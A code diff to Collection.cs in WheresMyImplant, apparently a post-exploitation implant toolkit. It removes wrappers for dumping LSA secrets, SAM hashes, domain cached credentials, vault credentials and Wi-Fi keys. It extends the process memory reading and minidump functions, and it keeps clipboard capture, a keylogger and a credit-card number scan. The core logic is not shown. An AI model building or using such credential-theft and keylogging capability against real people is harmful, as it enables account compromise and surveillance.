+++ WheresMyImplant/Collection.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Linq;
 
 using Tokenvator;
 
@@ -6,96 +7,7 @@ namespace WheresMyImplant
 {
     public sealed class Collection
     {
-        public static void DumpLsa()
-        {
-            try
-            {
-                CheckPrivileges checkSystem = new CheckPrivileges();
-                if (!checkSystem.GetSystem())
-                {
-                    Console.WriteLine("[-] GetSystem Failed");
-                    return;
-                }
-                LSASecrets lsaSecrets = new LSASecrets();
-                lsaSecrets.DumpLSASecrets();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[-] {0}", ex.Message);
-            }
-        }
-
-        public static void DumpSAM()
-        {
-            try
-            {
-                CheckPrivileges checkSystem = new CheckPrivileges();
-                if (!checkSystem.GetSystem())
-                {
-                    Console.WriteLine("[-] GetSystem Failed");
-                    return;
-                }
-                SAM sam = new SAM();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[-] {0}", ex.Message);
-            }
-        }
-
-        public static void DumpDomainCache()
-        {
-            try
-            {
-                CheckPrivileges checkSystem = new CheckPrivileges();
-                if (checkSystem.GetSystem())
-                {
-                    Console.WriteLine("[-] GetSystem Failed");
-                    return;
-                }
-                CacheDump cacheDump = new CacheDump();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[-] {0}", ex.Message);
-            }
-        }
-
-        public static void DumpVault()
-        {
-            try
-            {
-                Vault vault = new Vault();
-                vault.EnumerateCredentials();
-
-                CheckPrivileges checkSystem = new CheckPrivileges();
-                if (!checkSystem.GetSystem())
-                {
-                    Console.WriteLine("[-] GetSystem Failed");
-                    return;
-                }
-                vault = new Vault();
-                vault.EnumerateCredentials();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[-] {0}", ex.Message);
-            }
-        }
-
-        public static void DumpVaultCLI()
-        {
-            try
-            {
-                VaultCLI vault = new VaultCLI();
-                vault.EnumerateVaults();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[-] {0}", ex.Message);
-            }
-        }
-
+        //Checked
         public static void DumpBrowserHistory()
         {
             try
@@ -111,12 +23,24 @@ namespace WheresMyImplant
             }
         }
 
+        //Checked
         public static void ReadProcessMemory(String processId)
         {
             try
-            { 
+            {
                 if (!Int32.TryParse(processId, out Int32 pid))
-                    Console.WriteLine("[-] Unable to parse {0}", processId);
+                {
+                    System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName(processId);
+                    if (0 < process.Length)
+                    {
+                        pid = process.First().Id;
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Unable to parse {0}", processId);
+                        return;
+                    }
+                }
 
                 ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
                 if (!readProcessMemory.OpenProcess())
@@ -132,6 +56,7 @@ namespace WheresMyImplant
             }
         }
 
+        //Checked
         public static void CheckCCNumber(String input)
         {
             foreach (String number in CheckCreditCard.CheckString(input))
@@ -140,12 +65,24 @@ namespace WheresMyImplant
             }
         }
 
+        //Checked
         public static void MiniDump(String processId, String fileName)
         {
             try
             {
                 if (!Int32.TryParse(processId, out Int32 pid))
-                    Console.WriteLine("[-] Unable to parse {0}", processId);
+                {
+                    System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName(processId);
+                    if (0 < process.Length)
+                    {
+                        pid = process.First().Id;
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Unable to parse {0}", processId);
+                        return;
+                    }
+                }
 
                 MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
                 miniDump.CreateMiniDump((UInt32)pid, fileName);
@@ -156,6 +93,7 @@ namespace WheresMyImplant
             }
         }
 
+        //Checked
         public static void Clipboard()
         {
             try
@@ -169,25 +107,13 @@ namespace WheresMyImplant
             }
         }
 
+        //Checked
         public static void Keylogger()
         {
             try
             {
                 KeyLogger clipboard = new KeyLogger();
                 clipboard.Execute();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[-] {0}", ex.Message);
-            }
-        }
-
-        public static void WirelessPreSharedKey()
-        {
-            try
-            {
-                WirelessProfiles wp = new WirelessProfiles();
-                wp.GetProfiles();
             }
             catch (Exception ex)
             {
